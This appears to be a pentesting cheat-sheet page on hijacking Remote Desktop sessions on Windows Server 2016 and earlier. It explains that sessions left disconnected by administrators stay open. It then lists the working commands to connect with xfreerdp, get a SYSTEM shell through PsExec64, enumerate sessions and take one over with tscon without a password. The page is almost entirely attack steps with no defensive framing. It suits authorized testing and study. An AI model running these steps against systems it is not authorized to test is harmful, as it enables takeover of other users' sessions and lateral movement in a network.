---
title: RDP Hijacking
---

:::danger Required Privileges: `Administrators`

**Works only on `Windows Server 2016 and Earlier`.**

:::

When an **`Administrator`** uses <b>Remote Desktop</b> to connect to a machine and closes the **RDP** Client instead of Logging-Off, his Session will remain open on the server indefinitely. If we have **`SYSTEM`** **Privileges** on **Windows Server 2016 and Earlier,** we can take over any existing **RDP** Session without requiring a password.


```batch
:: Remote Desktop Protocol [RDP]
3389/TCP
```

<br/>

### Hijacking the Session

If we have **Administrator-Level** Access, we can get **SYSTEM** by any method of our preference.

```batch
:: Connect via RDP
xfreerdp /v:TARGET /u:USERNAME /p:PASSWORD

:: Upload - Run [PsExec64]
PsExec64.exe -accepteula

:: Interactive Mode [-i] 
PsExec64.exe -s cmd.exe
```

```batch
:: List Available Sessions
query user
query session

:: Connect to a Session
tscon ID /dest:OUR_SESSIONNAME
```